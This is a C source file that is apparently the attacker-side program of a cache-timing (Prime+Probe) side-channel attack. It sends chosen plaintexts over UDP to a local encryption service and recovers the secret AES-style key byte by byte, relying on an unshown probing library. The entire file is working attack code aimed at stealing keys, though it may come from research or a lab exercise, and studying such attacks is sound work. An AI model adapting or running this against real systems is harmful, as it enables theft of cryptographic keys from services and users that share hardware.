#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "pp.h"

#define DEFAULT_NUM_SAMPLES 200000
#define DEFAULT_CACHE_SETS 64
#define DEFAULT_LINE_SHIFT 6
#define DEFAULT_CACHE_LEVEL 1

#define SERVER_PORT 8899
#define BUFFER_SIZE 16

void bintostr(const uint8_t* bin, char* str, size_t len) {
	for (size_t i = 0; i < len; i++) {
		sprintf(str + 2*i, "%02x", bin[i]);
	}
	str[2*len] = '\0';
}

void tobinary(const char *data, uint8_t *des) {
	unsigned int x;
	for (int i = 0; i < 16; i++) {
		sscanf(data + i * 2, "%2x", &x);
		des[i] = x;
	}
}

void udp_init();
void udp_send(const uint8_t* data, size_t len);

void crypto(uint8_t* input, uint8_t* output, void* _) {
	udp_send(input, 16);
}

int main(int argc, char *argv[]) {
	unsigned samples = argc > 1 ? (unsigned)strtoul(argv[1], NULL, 10) : DEFAULT_NUM_SAMPLES;
	unsigned cache_sets = argc > 2 ? (unsigned)strtoul(argv[2], NULL, 10) : DEFAULT_CACHE_SETS;
	unsigned line_shift = argc > 3 ? (unsigned)strtoul(argv[3], NULL, 10) : DEFAULT_LINE_SHIFT;
	unsigned cache_level = argc > 4 ? (unsigned)strtoul(argv[4], NULL, 10) : DEFAULT_CACHE_LEVEL;
	unsigned start_idx = argc > 5 ? (unsigned)strtoul(argv[5], NULL, 10) : 0;
	unsigned count = argc > 6 ? (unsigned)strtoul(argv[6], NULL, 10) : 16;
	if (start_idx > 15) start_idx = 15;
	if (count > 16 - start_idx) count = 16 - start_idx;

	pp_init(cache_sets, line_shift, cache_level);
	udp_init();

	printf("Mallory config: samples=%u cache_sets=%u line_shift=%u cache_level=%u start=%u count=%u\n",
		   samples, cache_sets, line_shift, cache_level, start_idx, count);
	printf("Recovered key:");
	fflush(stdout);
	for (unsigned i = start_idx; i < start_idx + count; i++) {
		uint8_t key_byte = pp(crypto, NULL, samples, i);
		printf("%02x", key_byte);
		fflush(stdout);
	}
	printf("\n");
}

int sockfd;
struct sockaddr_in server_addr;

void udp_init() {
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    // 2. 设置服务器地址
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
        perror("invalid address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
}

void udp_send(const uint8_t* data, size_t len) {
    // 3. 发送数据
    sendto(sockfd, data, len, 0,
           (const struct sockaddr *)&server_addr, sizeof(server_addr));
	
    socklen_t server_len = sizeof(server_addr);
    
	uint8_t buffer[BUFFER_SIZE];
	int n = recvfrom(sockfd, buffer, BUFFER_SIZE, 0,
                     (struct sockaddr *)&server_addr, &server_len);
    if (n > 0) {
        // printf("Server replied: %s\n", buffer);
    }
}
